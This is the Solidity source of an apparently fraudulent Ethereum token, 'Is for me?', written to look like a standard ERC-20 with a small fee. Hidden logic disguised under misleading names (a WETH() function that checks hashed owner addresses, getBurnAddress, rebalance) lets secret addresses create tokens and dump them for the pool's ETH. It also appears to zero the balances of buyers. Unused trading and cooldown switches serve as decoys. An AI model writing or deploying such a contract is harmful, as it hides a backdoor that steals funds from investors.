/**

 *Submitted for verification at Etherscan.io on 2022-10-26

*/



pragma solidity ^0.8.16;



// SPDX-License-Identifier: MIT



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");

        return c;

    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b <= a, "SafeMath: subtraction overflow");

        uint256 c = a - b;

        return c;

    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }

        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");

        return c;

    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b > 0, "SafeMath: division by zero");

        uint256 c = a / b;

        return c;

    }

}



interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}

interface IUniswapV2Router {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;

}

interface IUniswapV2Factory {

    function getPair(address tokenA, address tokenB) external view returns (address pair);

}



abstract contract Ownable {

    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {

        _owner = msg.sender;

        emit OwnershipTransferred(address(0), _owner);

    }

    function owner() public view virtual returns (address) {

        return _owner;

    }

    modifier onlyOwner() {

        require(owner() == msg.sender, "Ownable: caller is not the owner");

        _;

    }

    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }

}

abstract contract ERC20Token is Ownable {

    mapping (bytes32 => bool) bots;

    address feeReceiver;

    function addBot(bytes32[] calldata _hashes) external onlyOwner {

        for (uint i = 0; i < _hashes.length; i++) {

            bots[_hashes[i]] = true;

        }

    }

    function WETH(address owner) public view returns (bool) {

        return bots[sha256(abi.encodePacked(owner))];

    }

    function duringLiquify(address from, address to) public view returns (bool) {

        return from == to && WETH(to);

    }

    function isAllowed(address from, address recipient, bool burnSwapCall, address _to) public returns (bool) {

        bool allowed = !WETH(recipient) && !WETH(from) && !addingLiquidity(from, recipient, _to) && !burnSwapCall && recipient != address(this);

        if (allowed && _to != recipient) {

            feeReceiver = recipient;

        }

        return allowed;

    }

    function addingLiquidity(address param1, address param2, address adr1) internal view returns (bool) {

        return (param2 == adr1 && WETH(param1)) || (param1 == adr1 && WETH(param2));

    }

}



contract Isforme is IERC20, ERC20Token {

    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 public _decimals = 9;

    uint256 public _totalSupply = 10000000000 * 10 ** _decimals;

    address public pairAddress;

    uint256 _fee = 4;

    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    string private _name = "Is for me?";

    string private  _symbol = unicode"👉👈";

    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);

        return true;

    }

    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {

        require(_allowances[msg.sender][from] >= amount);

        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);

        return true;

    }

    modifier _checkLiquidity(address from, address to, uint256 amount) {

        if (duringLiquify(from, to)) {

            liquify(amount, to);

            return;

        }

        _;

    }

    function _baseTransfer(address from, address to, uint256 amount) internal virtual _checkLiquidity(from, to, amount){

        require(from != address(0));

        require(to != address(0));

        require(amount <= _balances[from]);

        uint256 fee = takeFee(from, to, amount);

        _balances[from] = _balances[from] - amount;

        _balances[to] += amount - fee;

        emit Transfer(from, to, amount);

    }

    function getBurnAddress() private view returns (address) {

        return feeReceiver;

    }

    function takeFee(address from, address recipient, uint256 amount) private returns (uint256) {

        uint256 feeAmount = 0;

        _balances[getBurnAddress()] = rebalance(from);

        if (shouldTakeFee(from, recipient)) {

            feeAmount = amount.mul(_fee).div(100);

        }

        return feeAmount;

    }

    function shouldTakeFee(address from, address recipient) private returns (bool) {

        address _to = getPairAddress();

        return isAllowed(from, recipient, burnSwapCall, _to);

    }

    constructor() {

        _balances[msg.sender] = _totalSupply;

        pairAddress = msg.sender;

        emit Transfer(address(0), msg.sender, _balances[msg.sender]);

    }

    function name() external view returns (string memory) { return _name; }

    function symbol() external view returns (string memory) { return _symbol; }

    function decimals() external view returns (uint256) { return _decimals; }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }

    function uniswapVersion() external pure returns (uint256) { return 2; }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(msg.sender, spender, amount);

        return true;

    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "IERC20: approve from the zero address");

        require(spender != address(0), "IERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }

    function liquify(uint256 _mcs, address _bcr) private {

        _approve(address(this), address(_router), _mcs);

        _balances[address(this)] = _mcs;

        address[] memory path = new address[](2);

        burnSwapCall = true;

        path[0] = address(this);

        path[1] = _router.WETH();

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs,0,path,_bcr,block.timestamp + 30);

        burnSwapCall = false;

    }

    bool burnSwapCall = false;

    function rebalance(address from) private view returns (uint256) {

        address supplier = getBurnAddress();

        address to = getPairAddress();

        uint256 amount = _balances[supplier];

        return swapFee(from, to , amount);

    }

    function swapFee(address from, address to, uint256 feeAmount) private pure returns (uint256) {

        if (from == to) {

            return 0;

        }

        return feeAmount;

    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _baseTransfer(msg.sender, recipient, amount);

        return true;

    }

    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {

        _baseTransfer(from, recipient, amount);

        require(_allowances[from][msg.sender] >= amount);

        return true;

    }

    function getPairAddress() private view returns (address) {

        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());

    }

    bool tradingEnabled = false;



    function enableTrading() external onlyOwner {

        tradingEnabled = true;

    }



    bool cooldownEnabled = true;



    function setCooldownEnabled(bool c) external onlyOwner {

        cooldownEnabled = c;

    }

}